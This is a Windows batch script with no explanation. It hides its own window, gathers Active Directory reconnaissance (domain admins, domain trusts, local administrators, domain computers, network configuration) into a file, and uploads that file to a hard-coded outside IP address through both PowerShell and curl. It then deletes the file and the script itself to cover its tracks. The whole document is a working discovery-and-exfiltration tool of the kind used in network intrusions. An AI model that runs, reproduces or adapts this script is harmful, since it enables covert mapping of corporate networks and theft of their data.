@echo off

 if not "%1"=="hidden" (
     >nul 2>&1 start /min cmd /c "%~0" hidden
     exit
 )

(
    echo [Domain Admins]
    net group "domain admins" /domain 2>&1
    echo ====================================

    echo [Network Configuration]
    ipconfig /all 2>&1
    echo ====================================

    echo [Domain Trusts]
    nltest /domain_trusts 2>&1
    echo ====================================

    echo [Local Administrators]
    net localgroup administrators 2>&1
    echo ====================================

    echo [Domain Computers]
    net group "Domain Computers" /domain 2>&1
) > discovery.txt 2>&1

(
    for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr "IPv4"') do (
        for /f "tokens=* delims= " %%b in ("%%a") do (
            echo %%b
        )
    )
) > pc.txt 2>&1


powershell -nop -c "$url='http://192.123.226.84/test_upload'; $file='discovery.txt'; $bytes=[System.IO.File]::ReadAllBytes($file); $web=New-Object System.Net.WebClient; $web.UploadData($url, $bytes)" >nul 2>&1
curl -X POST --data-binary "@discovery.txt" http://192.123.226.84/test_upload >nul 2>&1


del "discovery.txt" /q >nul 2>&1 
del "%~f0"